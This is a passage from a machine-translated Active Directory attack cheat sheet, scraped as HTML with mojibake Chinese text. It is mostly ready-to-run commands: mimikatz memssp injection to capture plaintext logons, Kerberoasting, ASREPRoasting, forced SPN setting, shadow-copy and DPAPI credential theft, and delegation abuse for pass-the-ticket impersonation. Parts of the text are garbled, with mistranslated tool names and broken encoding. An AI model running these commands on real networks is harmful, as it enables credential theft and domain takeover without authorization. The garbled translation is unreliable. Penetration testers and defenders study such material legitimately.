id="a264" class="nl kw iq my b gy nm nn l no np">#Check if a process called lsaiso.exe exists on the running processes<br/>tasklist |findstr lsaiso</span><span id="29a9" class="nl kw iq my b gy nq nn l no np">#If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.<br/>#Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides<br/>mimikatz # misc::memssp</span><span id="e9d7" class="nl kw iq my b gy nq nn l no np">#Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log</span></pre><ul class=""><li id="da16" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><a class="ae mj" href="https://adsecurity.org/?page_id=1821" rel="noopener ugc nofollow" target="_blank">è¯¦ç»†çš„MimikatzæŒ‡å—</a></li><li id="c524" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a" rel="noopener">ç”¨2ä¸ªlsassä¿æŠ¤é€‰é¡¹å››å¤„æ‰“æ¢</a></li></ul><h1 id="0aca" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">æœ‰ç”¨çš„å·¥å…·</h1><ul class=""><li id="da62" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/besimorhino/powercat" rel="noopener ugc nofollow" target="_blank"> Powercat </a> netcatç”¨powershellç¼–å†™ï¼Œæä¾›éš§é“ã€ä¸­ç»§å’Œç«¯å£è½¬å‘åŠŸèƒ½ã€‚</li><li id="4b3a" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/Mr-Un1k0d3r/SCShell" rel="noopener ugc nofollow" target="_blank"> SCShell </a>ä¾é ChangeServiceConfigAè¿è¡Œå‘½ä»¤çš„æ— æ–‡ä»¶æ¨ªå‘ç§»åŠ¨å·¥å…·</li><li id="dd1c" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">ç”¨äºé»‘å®¢æ”»å‡»/æµ‹è¯•çš„ç»ˆæWinrmå¤–å£³</li><li id="1612" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/antonioCoco/RunasCs" rel="noopener ugc nofollow" target="_blank"> RunasCs </a> Csharpå’Œwindowså†…ç½®runas.exeçš„å¼€æ”¾ç‰ˆæœ¬</li></ul><h1 id="ce8c" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">åŸŸæƒé™æå‡</h1><h1 id="9e50" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">Kerberoast</h1><p id="d535" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><em class="of"> WUTæ˜¯DISï¼Ÿ:</em> <br/>æ‰€æœ‰æ ‡å‡†åŸŸç”¨æˆ·éƒ½å¯ä»¥è¯·æ±‚æ‰€æœ‰æœåŠ¡å¸æˆ·åŠå…¶ç›¸å…³å¯†ç å“ˆå¸Œçš„å‰¯æœ¬ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å‘TGSè¯·æ±‚ç»‘å®šåˆ°â€œç”¨æˆ·â€<br/>å¸æˆ·çš„ä»»ä½•SPNï¼Œæå–ä½¿ç”¨ç”¨æˆ·å¯†ç åŠ å¯†çš„åŠ å¯†blobå¹¶å¼ºåˆ¶å…¶ç¦»çº¿ã€‚</p><ul class=""><li id="08f9" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">PowerView:</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="f4c0" class="nl kw iq my b gy nm nn l no np">#Get User Accounts that are used as Service Accounts<br/>Get-NetUser -SPN</span><span id="b8b4" class="nl kw iq my b gy nq nn l no np">#Get every available SPN account, request a TGS and dump its hash<br/>Invoke-Kerberoast</span><span id="ed47" class="nl kw iq my b gy nq nn l no np">#Requesting the TGS for a single account:<br/>Request-SPNTicket<br/>  <br/>#Export all tickets using Mimikatz<br/>Invoke-Mimikatz -Command '"kerberos::list /export"'</span></pre><ul class=""><li id="d007" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">å¹¿å‘Šæ¨¡å—:</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="77ad" class="nl kw iq my b gy nm nn l no np">#Get User Accounts that are used as Service Accounts<br/>Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName</span></pre><ul class=""><li id="1e35" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">æ’å…¥åŒ…:</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="ad24" class="nl kw iq my b gy nm nn l no np">python GetUserSPNs.py &lt;DomainName&gt;/&lt;DomainUser&gt;:&lt;Password&gt; -outputfile &lt;FileName&gt;</span></pre><ul class=""><li id="3b9c" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">é²ä¼¯:</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="108b" class="nl kw iq my b gy nm nn l no np">#Kerberoasting and outputing on a file with a spesific format<br/>Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt;</span><span id="5cd5" class="nl kw iq my b gy nq nn l no np">#Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts<br/>Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /rc4opsec</span><span id="1735" class="nl kw iq my b gy nq nn l no np">#Kerberoast AES enabled accounts<br/>Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /aes<br/> <br/>#Kerberoast spesific user account<br/>Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /user:&lt;username&gt; /simple</span><span id="5c6f" class="nl kw iq my b gy nq nn l no np">#Kerberoast by specifying the authentication credentials <br/>Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /creduser:&lt;username&gt; /credpassword:&lt;password&gt;</span></pre><h1 id="58ad" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">ASREPRoast</h1><p id="358c" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><em class="of"> WUTæ˜¯DISï¼Ÿ:</em> <br/>å¦‚æœä¸€ä¸ªåŸŸç”¨æˆ·å¸æˆ·ä¸éœ€è¦kerberosé¢„è®¤è¯ï¼Œæˆ‘ä»¬ç”šè‡³å¯ä»¥åœ¨æ²¡æœ‰åŸŸå‡­è¯çš„æƒ…å†µä¸‹ä¸ºè¯¥å¸æˆ·è¯·æ±‚ä¸€ä¸ªæœ‰æ•ˆçš„TGTï¼Œæå–åŠ å¯†çš„<br/> blobå¹¶å¼ºåˆ¶å…¶ç¦»çº¿ã€‚</p><ul class=""><li id="401a" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">PowerView: <code class="fe mv mw mx my b">Get-DomainUser -PreauthNotRequired -Verbose</code></li><li id="8ac4" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">å¹¿å‘Šæ¨¡å—:<code class="fe mv mw mx my b">Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth</code></li></ul><p id="2b04" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">åœ¨æˆ‘æ‹¥æœ‰å†™æƒé™æˆ–æ›´å¤šæƒé™çš„å¸æˆ·ä¸Šå¼ºåˆ¶ç¦ç”¨Kerberosé¢„éªŒè¯ï¼æ£€æŸ¥å¸æˆ·ä¸Šæœ‰è¶£çš„æƒé™:</p><p id="68d2" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">æç¤º:æˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œä¾‹å¦‚RDPUsersï¼Œä»¥è·å¾—â€œç”¨æˆ·å¸æˆ·â€è€Œä¸æ˜¯æœºå™¨å¸æˆ·ï¼Œå› ä¸ºæœºå™¨å¸æˆ·å“ˆå¸Œæ˜¯ä¸å¯ç ´è§£çš„ï¼</p><p id="24d6" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">PowerView:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="dcc9" class="nl kw iq my b gy nm nn l no np">Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}<br/>Disable Kerberos Preauth:<br/>Set-DomainObject -Identity &lt;UserAccount&gt; -XOR @{useraccountcontrol=4194304} -Verbose<br/>Check if the value changed:<br/>Get-DomainUser -PreauthNotRequired -Verbose</span></pre><p id="41d2" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">æœ€åä½¿ç”¨<a class="ae mj" href="https://github.com/HarmJ0y/ASREPRoast" rel="noopener ugc nofollow" target="_blank">as repast</a>å·¥å…·æ‰§è¡Œæ”»å‡»ã€‚</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="5c0f" class="nl kw iq my b gy nm nn l no np">#Get a spesific Accounts hash:<br/>Get-ASREPHash -UserName &lt;UserName&gt; -Verbose</span><span id="8136" class="nl kw iq my b gy nq nn l no np">#Get any ASREPRoastable Users hashes:<br/>Invoke-ASREPRoast -Verbose</span></pre><p id="1458" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">ä½¿ç”¨çº¢è‰²:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="14ba" class="nl kw iq my b gy nm nn l no np">#Trying the attack for all domain users<br/>Rubeus.exe asreproast /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;</span><span id="6aa7" class="nl kw iq my b gy nq nn l no np">#ASREPRoast spesific user<br/>Rubeus.exe asreproast /user:&lt;username&gt; /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;</span><span id="be4d" class="nl kw iq my b gy nq nn l no np">#ASREPRoast users of a spesific OU (Organization Unit)<br/>Rubeus.exe asreproast /ou:&lt;OUName&gt; /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;</span></pre><p id="9f05" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">ä½¿ç”¨Impacket:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="5448" class="nl kw iq my b gy nm nn l no np">#Trying the attack for the specified users on the file<br/>python GetNPUsers.py &lt;domain_name&gt;/ -usersfile &lt;users_file&gt; -outputfile &lt;FileName&gt;</span></pre><h1 id="93ac" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">å¯†ç å–·é›¾æ”»å‡»</h1><p id="dd72" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">å¦‚æœæˆ‘ä»¬é€šè¿‡æ³„éœ²ç”¨æˆ·å¸æˆ·è·å¾—äº†ä¸€äº›å¯†ç ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ç§æ–¹æ³•æ¥å°è¯•å’Œåˆ©ç”¨å…¶ä»–åŸŸå¸æˆ·ä¸Šçš„å¯†ç é‡ç”¨ã€‚</p><p id="ac65" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">å·¥å…·:</p><ul class=""><li id="bf75" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/dafthack/DomainPasswordSpray" rel="noopener ugc nofollow" target="_blank">åŸŸåå¯†ç ç¥ˆç¥·</a></li><li id="927d" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/byt3bl33d3r/CrackMapExec" rel="noopener ugc nofollow" target="_blank"> CrackMapExec </a></li><li id="c3e6" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/wavestone-cdt/Invoke-CleverSpray" rel="noopener ugc nofollow" target="_blank">è°ƒç”¨-CleverSpray </a></li><li id="78f7" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/Greenwolf/Spray" rel="noopener ugc nofollow" target="_blank">å–·</a></li></ul><h1 id="a3f5" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">å¼ºåˆ¶è®¾ç½®SPN</h1><p id="0dc8" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><em class="of"> WUTæ˜¯DISï¼Ÿ:å¦‚æœæˆ‘ä»¬æœ‰è¶³å¤Ÿçš„æƒé™- &gt; GenericAll/GenericWriteæˆ‘ä»¬å¯ä»¥åœ¨ä¸€ä¸ªç›®æ ‡å¸æˆ·ä¸Šè®¾ç½®ä¸€ä¸ªSPNï¼Œè¯·æ±‚ä¸€ä¸ªTGSï¼Œç„¶åæŠ“å–å®ƒçš„blobå¹¶å¼ºåˆ¶æ‰§è¡Œã€‚</em></p><ul class=""><li id="62ce" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">PowerView:</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="f7ad" class="nl kw iq my b gy nm nn l no np">#Check for interesting permissions on accounts:<br/>Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}<br/> <br/>#Check if current user has already an SPN setted:<br/>Get-DomainUser -Identity &lt;UserName&gt; | select serviceprincipalname<br/> <br/>#Force set the SPN on the account:<br/>Set-DomainObject &lt;UserName&gt; -Set @{serviceprincipalname='ops/whatever1'}</span></pre><ul class=""><li id="df1d" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">å¹¿å‘Šæ¨¡å—:</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="ba32" class="nl kw iq my b gy nm nn l no np">#Check if current user has already an SPN setted<br/>Get-ADUser -Identity &lt;UserName&gt; -Properties ServicePrincipalName | select ServicePrincipalName<br/>  <br/>#Force set the SPN on the account:<br/>Set-ADUser -Identiny &lt;UserName&gt; -ServicePrincipalNames @{Add='ops/whatever1'}</span></pre><p id="7832" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">æœ€åï¼Œä½¿ç”¨ä¹‹å‰çš„ä»»ä½•å·¥å…·è·å–hashå¹¶è¿›è¡Œkerberoastè®¤è¯ï¼</p><h1 id="909f" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">æ»¥ç”¨å·å½±å‰¯æœ¬</h1><p id="a96b" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">å¦‚æœæ‚¨åœ¨ä¸€å°æœºå™¨ä¸Šæœ‰æœ¬åœ°ç®¡ç†å‘˜æƒé™ï¼Œè¯·å°è¯•åˆ—å‡ºå·å½±å‰¯æœ¬ï¼Œè¿™æ˜¯ä¸€ç§ç®€å•çš„åŸŸå‡çº§æ–¹æ³•ã€‚</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="724d" class="nl kw iq my b gy nm nn l no np">#List shadow copies using vssadmin (Needs Admnistrator Access)<br/>vssadmin list shadows<br/>  <br/>#List shadow copies using diskshadow<br/>diskshadow list shadows all<br/>  <br/>#Make a symlink to the shadow copy and access it<br/>mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\</span></pre><ol class=""><li id="7f71" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi og ms mt mu bi translated">æ‚¨å¯ä»¥è½¬å‚¨å¤‡ä»½çš„SAMæ•°æ®åº“å¹¶æ”¶é›†å‡­æ®ã€‚</li><li id="8aa7" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi og ms mt mu bi translated">æŸ¥æ‰¾DPAPIå­˜å‚¨çš„å‡­è¯å¹¶è§£å¯†å®ƒä»¬ã€‚</li><li id="07f8" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi og ms mt mu bi translated">è®¿é—®å¤‡ä»½çš„æ•æ„Ÿæ–‡ä»¶ã€‚</li></ol><h1 id="3321" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">ä½¿ç”¨Mimikatzåˆ—å‡ºå¹¶è§£å¯†å­˜å‚¨çš„å‡­è¯</h1><p id="6cfe" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">é€šå¸¸ï¼ŒåŠ å¯†çš„å‡­æ®å­˜å‚¨åœ¨:</p><ul class=""><li id="2256" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><code class="fe mv mw mx my b">%appdata%\Microsoft\Credentials</code></li><li id="be0a" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><code class="fe mv mw mx my b">%localappdata%\Microsoft\Credentials</code></li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="a010" class="nl kw iq my b gy nm nn l no np">#By using the cred function of mimikatz we can enumerate the cred object and get information about it:<br/>dpapi::cred /in:"%appdata%\Microsoft\Credentials\&lt;CredHash&gt;"</span><span id="f080" class="nl kw iq my b gy nq nn l no np">#From the previous command we are interested to the "guidMasterKey" parameter, that tells us which masterkey was used to encrypt the credential<br/>#Lets enumerate the Master Key:<br/>dpapi::masterkey /in:"%appdata%\Microsoft\Protect\&lt;usersid&gt;\&lt;MasterKeyGUID&gt;"</span><span id="b39d" class="nl kw iq my b gy nq nn l no np">#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:<br/>dpapi::masterkey /in:"%appdata%\Microsoft\Protect\&lt;usersid&gt;\&lt;MasterKeyGUID&gt;" /rpc</span><span id="a0df" class="nl kw iq my b gy nq nn l no np">#We now have the masterkey in our local cache:<br/>dpapi::cache</span><span id="bb89" class="nl kw iq my b gy nq nn l no np">#Finally we can decrypt the credential using the cached masterkey:<br/>dpapi::cred /in:"%appdata%\Microsoft\Credentials\&lt;CredHash&gt;"</span></pre><p id="3ebc" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">è¯¦ç»†æ–‡ç« :<a class="ae mj" href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials" rel="noopener ugc nofollow" target="_blank"> DPAPIæ‰€æœ‰çš„ä¸œè¥¿</a></p><h1 id="5120" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">ä¸å—é™åˆ¶çš„å§”æ‰˜</h1><p id="41f0" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><em class="of"> WUTæ˜¯DISï¼Ÿ:å¦‚æœæˆ‘ä»¬åœ¨å¯ç”¨äº†æ— çº¦æŸå§”æ´¾çš„æœºå™¨ä¸Šå…·æœ‰ç®¡ç†è®¿é—®æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥ç­‰å¾…é«˜ä»·å€¼ç›®æ ‡æˆ–DAè¿æ¥åˆ°è¯¥æœºå™¨ï¼Œçªƒå–ä»–çš„TGTï¼Œç„¶åè¿›è¡Œpttå¹¶å†’å……ä»–ï¼</em></p><p id="00ed" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">ä½¿ç”¨PowerView:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="519c" class="nl kw iq my b gy nm nn l no np">#Discover domain joined computers that have Unconstrained Delegation enabled<br/>Get-NetComputer -UnConstrained</span><span id="5e87" class="nl kw iq my b gy nq nn l no np">#List tickets and check if a DA or some High Value target has stored its TGT<br/>Invoke-Mimikatz -Command '"sekurlsa::tickets"'</span><span id="6e8a" class="nl kw iq my b gy nq nn l no np">#Command to monitor any incoming sessions on our compromised server<br/>Invoke-UserHunter -ComputerName &lt;NameOfTheComputer&gt; -Poll &lt;TimeOfMonitoringInSeconds&gt; -UserName &lt;UserToMonitorFor&gt; -Delay   <br/>&lt;WaitInterval&gt; -Verbose</span><span id="6355" class="nl kw iq my b gy nq nn l no np">#Dump the tickets to disk:<br/>Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'</span><span id="2af8" class="nl kw iq my b gy nq nn l no np">#Impersonate the user using ptt attack:<br/>Invoke-Mimikatz -Command '"kerberos::ptt &lt;PathToTicket&gt;"'</span></pre><p id="e8b0" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">æ³¨æ„:æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨é²ä¼¯ï¼</p><h1 id="dbee" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">å—çº¦æŸçš„å§”æ‰˜</h1><p id="0b6e" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated">ä½¿ç”¨PowerViewå’ŒKekeo:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="17fa" class="nl kw iq my b gy nm nn l no np">#Enumerate Users and Computers with constrained delegation<br/>Get-DomainUser -TrustedToAuth<br/>Get-DomainComputer -TrustedToAuth</span><span id="453a" class="nl kw iq my b gy nq nn l no np">#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo<br/>tgt::ask /user:&lt;UserName&gt; /domain:&lt;Domain's FQDN&gt; /rc4:&lt;hashedPasswordOfTheUser&gt;</span><span id="e6f7" class="nl kw iq my b gy nq nn l no np">#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation<br/>tgs::s4u /tgt:&lt;PathToTGT&gt; /user:&lt;UserToImpersonate&gt;@&lt;Domain's FQDN&gt; /service:&lt;Service's SPN&gt;</span><span id="329e" class="nl kw iq my b gy nq nn l no np">#Finally use mimikatz to ptt the TGS<br/>Invoke-Mimikatz -Command '"kerberos::ptt &lt;PathToTGS&gt;"'</span></pre><p id="d7b6" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><em class="of">æ›¿ä»£:</em>ä½¿ç”¨çº¢è‰²:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="b42b" class="nl kw iq my b gy nm nn l no np">Rubeus.exe s4u /user:&lt;UserName&gt; /rc4:&lt;NTLMhashedPasswordOfTheUser&gt; /impersonateuser:&lt;UserToImpersonate&gt; /msdsspn:"&lt;Service's SPN&gt;" /altservice:&lt;Optional&gt; /ptt</span></pre><p id="be9c" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">ç°åœ¨æˆ‘ä»¬å¯ä»¥ä»¥æ¨¡æ‹Ÿç”¨æˆ·çš„èº«ä»½è®¿é—®æœåŠ¡äº†ï¼</p><p id="512e" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">ğŸš©å¦‚æœæˆ‘ä»¬åªæœ‰ä¸€ä¸ªç‰¹å®šçš„SPNçš„å§”æ‰˜æƒé™ä¼šæ€ä¹ˆæ ·ï¼Ÿ(ä¾‹å¦‚æ—¶é—´):</p><p id="d028" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥æ»¥ç”¨kerberosçš„ä¸€ä¸ªç§°ä¸ºâ€œæ›¿ä»£æœåŠ¡â€çš„ç‰¹æ€§ã€‚è¿™ä½¿å¾—æˆ‘ä»¬å¯ä»¥è¯·æ±‚TGSå…¶ä»–â€œæ›¿ä»£â€æœåŠ¡çš„é—¨ç¥¨ï¼Œè€Œä¸ä»…ä»…æ˜¯æˆ‘ä»¬æœ‰æƒåˆ©çš„æœåŠ¡ã€‚è¿™ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸ºä¸»æœºæ”¯æŒçš„ä»»ä½•æœåŠ¡è¯·æ±‚æœ‰æ•ˆçš„ç¥¨è¯ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿå®Œå…¨è®¿é—®ç›®æ ‡æœºå™¨ã€‚</p><h1 id="f2b1" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">åŸºäºèµ„æºçš„å—é™å§”æ‰˜</h1><p id="06fd" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><em class="of"> WUTæ˜¯DISï¼Ÿ:<br/>TLï¼›å¦‚æœæˆ‘ä»¬åœ¨ä¸€ä¸ªåŸŸçš„æœºå™¨å¸æˆ·å¯¹è±¡ä¸Šæœ‰GenericALL/GenericWriteç‰¹æƒï¼Œæˆ‘ä»¬å°±å¯ä»¥æ»¥ç”¨å®ƒï¼Œå¹¶æŠŠæˆ‘ä»¬è‡ªå·±å†’å……æˆè¿™ä¸ªåŸŸçš„ä»»ä½•ç”¨æˆ·ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥æ¨¡æ‹ŸåŸŸç®¡ç†å‘˜å¹¶æ‹¥æœ‰å®Œå…¨çš„è®¿é—®æƒé™ã€‚</em></p><p id="355a" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">æˆ‘ä»¬å°†ä½¿ç”¨çš„å·¥å…·:</p><ul class=""><li id="4810" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon" rel="noopener ugc nofollow" target="_blank"> PowerView </a></li><li id="9b9d" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/Kevin-Robertson/Powermad" rel="noopener ugc nofollow" target="_blank">åŠ¨åŠ›ç‹‚</a></li><li id="0226" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/GhostPack/Rubeus" rel="noopener ugc nofollow" target="_blank">çº¢è‰²</a></li></ul><p id="3233" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦è¾“å…¥å¯¹è¯¥å¯¹è±¡æ‹¥æœ‰æƒé™çš„ç”¨æˆ·/æœºå™¨å¸æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ã€‚å¦‚æœè¿™æ˜¯ä¸€ä¸ªç”¨æˆ·å¸æˆ·ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨é€šè¿‡å“ˆå¸Œï¼ŒRDPï¼ŒPSCredentialsç­‰ã€‚</p><p id="b6df" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">åˆ©ç”¨ç¤ºä¾‹:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="1d3f" class="nl kw iq my b gy nm nn l no np">#Import Powermad and use it to create a new MACHINE ACCOUNT<br/>. .\Powermad.ps1<br/>New-MachineAccount -MachineAccount &lt;MachineAccountName&gt; -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose</span><span id="23d3" class="nl kw iq my b gy nq nn l no np">#Import PowerView and get the SID of our new created machine account<br/>. 